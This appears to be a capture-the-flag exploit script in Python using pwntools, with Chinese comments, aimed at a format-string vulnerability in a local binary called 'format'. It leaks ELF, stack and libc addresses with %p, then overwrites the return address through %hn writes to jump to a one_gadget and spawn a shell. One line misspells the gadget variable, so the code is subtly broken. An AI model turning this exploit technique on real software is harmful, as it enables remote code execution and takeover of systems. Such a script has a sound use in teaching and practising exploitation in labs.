# -*- coding: utf-8 -*-
from pwn import*
local = 1
if local:         #if else 使用选择本地或者远程
	p = process('./format')
	libc = ELF('./libc-2.23.so')
else:
	p = remote()

def link(content):
    p.sendlineafter('Choice:','1')
    p.sendlineafter('say:',content)
    return p.recvline()

elf_base=int(link('%3$p'),16)-0x8f3
print'elfbase:'+hex(elf_base)
ret_stack = int(link('%5$p'), 16)-0x98#保存返还地址的栈
print'ret_stack:'+hex(ret_stack)#因为printf答应出来的每个参数为四个字节，用%n修改返还地址的话参数过大，用%hn就要构造rop
libc_main=link('%11$p')
libc_base=int(libc_main,16)-0xf1-0x18540
onegadget_addr=libc_base+0x5f065
print 'libcbase:'+hex(libc_base)
print'onegadget:'+hex(onegadget_addr)
link('%' + str(ret_stack & 0xffff) + 'c%5$hn')#修改的是后面四个位的地址，看成八位地址
link('%' + str((onegadget_addr) & 0xffff) + 'c%53$hn')#修改reraddr的onegadget后四位为，
link('%' + str((ret_stack+2) & 0xffff) + 'c%5$hn')#修改指向ret
link('%' + str((oneadget_addr) >> 16) + 'c%53$hn')#右移动四位，>>8是右移动2位。这里是获取高四位，修改retaddr的前四位为onegadget前四位
#这里的第二步和第四步，%53$其实是%5$指向的栈，第一步我们把%5$改成指向返还地址的栈指针之后，我们修改参数%53$其实就修改了返还地址。
#%53$->%5$->ret
#我们第四步想要继续修改返还地址，那么我们第三步将将%5$指向的位置变成ret+2，那么我们就可以修改返还地址的高四位
#%53$->%5$->ret+2，
# 主要是我们的%hn只能一次修改两个字节，地址。地址应该是这样存储的：onegadget：0x12345678   存储：5678|1234
p.sendlineafter('Choice:','2')
p.interactive()
